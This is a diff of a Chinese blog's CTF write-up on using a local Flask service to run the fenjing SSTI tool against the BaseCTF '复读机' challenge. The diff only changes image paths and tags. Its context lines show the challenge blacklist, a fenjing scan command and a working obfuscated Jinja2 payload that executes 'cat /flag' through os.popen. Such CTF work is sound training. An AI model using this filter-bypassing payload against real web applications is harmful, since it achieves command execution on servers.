@@ -17,19 +17,19 @@
 <meta property="og:site_name" content="zhou">
 <meta property="og:description" content="前言继上篇文章模块注入-SSTI后，遇到了一些新的问题">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://blog.zyp0422.mom/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/1.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/2.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/3.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/4.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/5.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/6.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/1.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/2.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/3.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/4.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/5.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/6.png">
 <meta property="article:published_time" content="2024-09-05T02:34:38.000Z">
-<meta property="article:modified_time" content="2024-09-05T03:34:51.961Z">
+<meta property="article:modified_time" content="2024-09-09T06:40:44.210Z">
 <meta property="article:author" content="zhoupeng">
 <meta property="article:tag" content="web">
 <meta property="article:tag" content="SSTI">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://blog.zyp0422.mom/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/1.png">
+<meta name="twitter:image" content="https://blog.zyp0422.mom/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/1.png">
   
     <link rel="alternative" href="/atom.xml" title="zhou" type="application/atom+xml">
   
@@ -395,11 +395,11 @@
 
 	
 		<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>继上篇文章<a href="http://blog.zyp0422.mom/%E6%A8%A1%E5%9D%97%E6%B3%A8%E5%85%A5-SSTI/">模块注入-SSTI</a>后，遇到了一些新的问题<span id="more"></span></p>
-<p><img src="/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/1.png"></p>
+<p><img src="/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/1.png"></p>
 <p>正常情况下是像上面一样直接输入就可以了，这样是可以使用fenjing跑payload的</p>
-<p><img src="/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/2.png"></p>
+<p><img src="/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/2.png"></p>
 <p>但是有些是需要指定格式输入的，如下图需要你输入指定格式Hello，，这样你就无法通过fenjing直接跑payload</p>
-<p><img src="/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/3.png"></p>
+<p><img src="/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/3.png"></p>
 <p>这时候就需要通过flask在本地搭建一个ssti服务</p>
 <h3 id="flask搭建本地ssti服务"><a href="#flask搭建本地ssti服务" class="headerlink" title="flask搭建本地ssti服务"></a>flask搭建本地ssti服务</h3><h4 id="安装flask"><a href="#安装flask" class="headerlink" title="安装flask"></a>安装flask</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">pip</span> <span class="selector-tag">install</span> <span class="selector-tag">flask</span></span><br></pre></td></tr></table></figure>
 
@@ -422,7 +422,7 @@
 <p>接着就可以用fenjing跑payload了</p>
 <h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>题目：BaseCTF[Week3] 复读机</p>
 <p>打开题目，如下图，要求我们必须输入开头BaseCTF，这也就导致了我们无法直接使用fenjing跑payload了</p>
-<p><img src="/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/4.png"></p>
+<p><img src="/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/4.png"></p>
 <p>且题目过滤了许多，通过手动试出过滤内容</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">blacklist = [</span><br><span class="line">    <span class="string">&#x27;&#123;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;base&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>, <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;global&#x27;</span>, <span class="string">&#x27;builtin&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;request&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;lipsum&#x27;</span>, <span class="string">&#x27;cycler&#x27;</span>, <span class="string">&#x27;url_for&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;pop&#x27;</span>, <span class="string">&#x27;format&#x27;</span>, <span class="string">&#x27;replace&#x27;</span>, <span class="string">&#x27;reverse&#x27;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
 
@@ -432,12 +432,12 @@
 <p>启动服务并使用fenjing跑payload</p>
 <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">python3</span> <span class="selector-tag">-m</span> <span class="selector-tag">fenjing</span> <span class="selector-tag">scan</span> <span class="selector-tag">--url</span> &quot;<span class="selector-tag">http</span>:<span class="comment">//192.168.1.192:5000&quot;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/5.png"></p>
+<p><img src="/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/5.png"></p>
 <p>横线中间的就是我们的payload，这时候只需要在开头加上BaseCTF就可以获取flag了</p>
 <p>最终paylaod</p>
 <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">BaseCTF</span>&#123;%<span class="selector-tag">set</span> <span class="selector-tag">in</span>=&#x27;<span class="selector-tag">_</span>&#x27;~&#x27;<span class="selector-tag">_</span>&#x27;~&#x27;<span class="selector-tag">i</span>&#x27;&#x27;<span class="selector-tag">nit</span>&#x27;~&#x27;<span class="selector-tag">_</span>&#x27;~&#x27;<span class="selector-tag">_</span>&#x27;%&#125;&#123;%<span class="selector-tag">set</span> <span class="selector-tag">gl</span>=&#x27;<span class="selector-tag">_</span>&#x27;~&#x27;<span class="selector-tag">_</span>&#x27;~&#x27;<span class="selector-tag">g</span>&#x27;&#x27;<span class="selector-tag">lobals</span>&#x27;~&#x27;<span class="selector-tag">_</span>&#x27;~&#x27;<span class="selector-tag">_</span>&#x27;%&#125;&#123;%<span class="selector-tag">set</span> <span class="selector-tag">bu</span>=&#x27;<span class="selector-tag">_</span>&#x27;~&#x27;<span class="selector-tag">_</span>&#x27;~&#x27;<span class="selector-tag">b</span>&#x27;&#x27;<span class="selector-tag">uiltins</span>&#x27;~&#x27;<span class="selector-tag">_</span>&#x27;~&#x27;<span class="selector-tag">_</span>&#x27;%&#125;&#123;%<span class="selector-tag">set</span> <span class="selector-tag">im</span>=&#x27;<span class="selector-tag">_</span>&#x27;~&#x27;<span class="selector-tag">_</span>&#x27;~&#x27;<span class="selector-tag">import</span>&#x27;~&#x27;<span class="selector-tag">_</span>&#x27;~&#x27;<span class="selector-tag">_</span>&#x27;%&#125;&#123;%<span class="selector-tag">set</span> <span class="selector-tag">fu</span>=&#x27;<span class="selector-tag">OS</span>&#x27;|<span class="selector-tag">lower</span>%&#125;&#123;%<span class="selector-tag">set</span> <span class="selector-tag">ca</span>=&#x27;%<span class="selector-tag">c</span>%<span class="selector-tag">c</span>%<span class="selector-tag">c</span>%<span class="selector-tag">c</span>%<span class="selector-tag">c</span>%<span class="selector-tag">c</span>%<span class="selector-tag">c</span>%<span class="selector-tag">c</span>%<span class="selector-tag">c</span>&#x27;%(<span class="number">99</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">47</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>)%&#125;&#123;%<span class="selector-tag">print</span> <span class="selector-tag">joiner</span><span class="selector-attr">[in]</span><span class="selector-attr">[gl]</span><span class="selector-attr">[bu]</span><span class="selector-attr">[im]</span>(fu)<span class="selector-attr">[<span class="string">&#x27;p&#x27;</span><span class="string">&#x27;open&#x27;</span>]</span>(ca)<span class="selector-attr">[<span class="string">&#x27;read&#x27;</span>]</span>()%&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/6.png"></p>
+<p><img src="/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/flask%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0ssti%E6%9C%8D%E5%8A%A1/6.png"></p>
 
 	
 
@@ -791,15 +791,15 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">文件上传</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">kali</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">SSTI</a>
+                <a href="javascript:void(0)" class="js-tag color5">文件上传</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">XSS</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -815,7 +815,7 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">XSS</a>
+                <a href="javascript:void(0)" class="js-tag color5">SSTI</a>
               </li>
              
               <li class="article-tag-list-item">
